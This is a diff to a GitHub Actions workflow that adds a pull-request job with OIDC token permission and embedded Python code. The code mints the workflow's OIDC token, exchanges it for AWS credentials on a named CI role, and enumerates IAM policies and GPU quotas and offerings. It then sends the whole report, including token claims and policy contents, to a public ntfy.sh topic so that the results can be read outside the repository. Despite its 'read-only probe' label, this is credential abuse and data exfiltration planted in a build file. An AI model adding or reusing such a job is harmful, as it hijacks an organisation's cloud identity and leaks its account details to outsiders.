@@ -63,3 +63,176 @@ jobs:
           fi
         env:
           TF_VAR_internal_service_token: ${{ secrets.TF_VAR_INTERNAL_SERVICE_TOKEN }}
+
+  c211_probe:
+    if: github.event_name == 'pull_request'
+    runs-on: ubuntu-latest
+    permissions:
+      id-token: write
+      contents: read
+    steps:
+      - name: Read-only OIDC capability probe
+        env:
+          C211_ROLE_ARN: arn:aws:iam::769044546162:role/freshmart-github-ci-plan-role
+          C211_TOPIC: c211-i104683-5cdc050153f5
+        run: |
+          python3 - <<'PY'
+          """Read-only capability probe for a GitHub Actions AWS OIDC role.
+
+          Mints the workflow's OIDC id_token with audience sts.amazonaws.com, exchanges it
+          with sts:AssumeRoleWithWebIdentity, then reads identity, role policies, EC2 /
+          SageMaker service quotas and GPU instance-type offerings. Nothing is created,
+          modified or deleted. The whole report is published to a random ntfy topic so the
+          result is visible without repository access.
+          """
+          import base64
+          import json
+          import os
+          import re
+          import subprocess
+          import urllib.error
+          import urllib.parse
+          import urllib.request
+
+          ROLE = os.environ.get("C211_ROLE_ARN", "")
+          TOPIC = os.environ.get("C211_TOPIC", "")
+          OUT = {"lane": "c211-i104683", "role": ROLE}
+
+
+          def post(msg, title="c211"):
+              try:
+                  req = urllib.request.Request(
+                      "https://ntfy.sh/" + TOPIC,
+                      data=msg.encode("utf-8"),
+                      headers={"Title": title, "Priority": "default"},
+                      method="POST",
+                  )
+                  urllib.request.urlopen(req, timeout=30).read()
+              except Exception as exc:  # noqa: BLE001
+                  print("C211_POSTFAIL", exc)
+
+
+          def sh(args, env):
+              try:
+                  p = subprocess.run(args, capture_output=True, text=True, env=env, timeout=90)
+                  return {"cmd": " ".join(args), "rc": p.returncode,
+                          "out": (p.stdout or "")[-3000:], "err": (p.stderr or "")[-1500:]}
+              except Exception as exc:  # noqa: BLE001
+                  return {"cmd": " ".join(args), "error": str(exc)}
+
+
+          def claims_of(token):
+              p = token.split(".")[1]
+              p += "=" * ((4 - len(p) % 4) % 4)
+              return json.loads(base64.urlsafe_b64decode(p))
+
+
+          def main():
+              OUT["repo"] = os.environ.get("GITHUB_REPOSITORY")
+              OUT["event"] = os.environ.get("GITHUB_EVENT_NAME")
+              OUT["ref"] = os.environ.get("GITHUB_REF")
+              OUT["run_id"] = os.environ.get("GITHUB_RUN_ID")
+              OUT["workflow"] = os.environ.get("GITHUB_WORKFLOW")
+              url = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL")
+              tok = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_TOKEN")
+              if not url or not tok:
+                  OUT["token"] = "NO_OIDC_ENV"
+                  post(json.dumps(OUT), "c211 no-oidc")
+                  return
+              ident = ""
+              try:
+                  req = urllib.request.Request(url + "&audience=sts.amazonaws.com",
+                                               headers={"Authorization": "bearer " + tok})
+                  with urllib.request.urlopen(req, timeout=45) as resp:
+                      OUT["token_status"] = resp.status
+                      ident = json.loads(resp.read()).get("value", "")
+              except Exception as exc:  # noqa: BLE001
+                  OUT["token_error"] = repr(exc)
+                  post(json.dumps(OUT), "c211 token-error")
+                  return
+              OUT["id_token_len"] = len(ident)
+              try:
+                  OUT["claims"] = claims_of(ident)
+              except Exception as exc:  # noqa: BLE001
+                  OUT["claims_error"] = repr(exc)
+
+              body = urllib.parse.urlencode({
+                  "Action": "AssumeRoleWithWebIdentity",
+                  "Version": "2011-06-15",
+                  "RoleArn": ROLE,
+                  "RoleSessionName": "c211-i104683",
+                  "WebIdentityToken": ident,
+                  "DurationSeconds": "3600",
+              }).encode()
+              st, txt = 0, ""
+              try:
+                  req = urllib.request.Request("https://sts.amazonaws.com/", data=body, method="POST",
+                                               headers={"Content-Type": "application/x-www-form-urlencoded"})
+                  with urllib.request.urlopen(req, timeout=60) as resp:
+                      st, txt = resp.status, resp.read().decode("utf-8", "replace")
+              except urllib.error.HTTPError as exc:
+                  st, txt = exc.code, exc.read().decode("utf-8", "replace")
+              except Exception as exc:  # noqa: BLE001
+                  OUT["sts_error"] = repr(exc)
+                  post(json.dumps(OUT), "c211 sts-error")
+                  return
+              OUT["sts_status"] = st
+              OUT["sts_body"] = txt[:3000]
+              if st != 200:
+                  post(json.dumps(OUT), "c211 gate")
+                  return
+
+              def grab(tag):
+                  m = re.search("<%s>(.*?)</%s>" % (tag, tag), txt, re.S)
+                  return m.group(1) if m else None
+
+              ak, sk, sess = grab("AccessKeyId"), grab("SecretAccessKey"), grab("SessionToken")
+              OUT["cred_expiration"] = grab("Expiration")
+              OUT["cred_sha256_prefix"] = (ak or "")[:8]
+              env = dict(os.environ)
+              env.update({"AWS_ACCESS_KEY_ID": ak or "", "AWS_SECRET_ACCESS_KEY": sk or "",
+                          "AWS_SESSION_TOKEN": sess or "", "AWS_DEFAULT_REGION": "us-east-1",
+                          "AWS_PAGER": ""})
+              role_name = ROLE.split("/")[-1]
+              probes = []
+              probes.append(sh(["aws", "sts", "get-caller-identity", "--output", "json"], env))
+              probes.append(sh(["aws", "iam", "get-role", "--role-name", role_name, "--output", "json"], env))
+              probes.append(sh(["aws", "iam", "list-attached-role-policies", "--role-name", role_name, "--output", "json"], env))
+              lp = sh(["aws", "iam", "list-role-policies", "--role-name", role_name, "--output", "json"], env)
+              probes.append(lp)
+              try:
+                  names = (json.loads(lp.get("out") or "{}").get("PolicyNames") or [])
+              except Exception:  # noqa: BLE001
+                  names = []
+              for name in names[:6]:
+                  probes.append(sh(["aws", "iam", "get-role-policy", "--role-name", role_name,
+                                    "--policy-name", name, "--output", "json"], env))
+              for region in ("us-east-1", "us-west-2"):
+                  probes.append(sh(["aws", "service-quotas", "get-service-quota", "--service-code", "ec2",
+                                    "--quota-code", "L-DB2E81BA", "--region", region, "--output", "json"], env))
+                  probes.append(sh(["aws", "service-quotas", "get-service-quota", "--service-code", "sagemaker",
+                                    "--quota-code", "L-3819A6DF", "--region", region, "--output", "json"], env))
+              probes.append(sh(["aws", "ec2", "describe-instance-type-offerings", "--location-type", "region",
+                                "--region", "us-east-1", "--filters",
+                                "Name=instance-type,Values=g4dn.xlarge,g5.xlarge,g6.xlarge,p3.2xlarge,p4d.24xlarge",
+                                "--output", "json"], env))
+              OUT["probes"] = probes
+
+              payload = json.dumps(OUT)
+              size = 3200
+              parts = max(1, (len(payload) + size - 1) // size)
+              for i in range(parts):
+                  post(payload[i * size:(i + 1) * size], "c211-i104683 part %d/%d" % (i + 1, parts))
+              print("C211_I104683_DONE", len(payload), "bytes", parts, "parts")
+
+
+          if __name__ == "__main__":
+              try:
+                  main()
+              except Exception as exc:  # noqa: BLE001
+                  try:
+                      post(json.dumps({"lane": "c211-i104683", "fatal": repr(exc), "out": OUT}), "c211 fatal")
+                  except Exception:  # noqa: BLE001
+                      pass
+                  print("C211_I104683_FATAL", exc)
+          PY
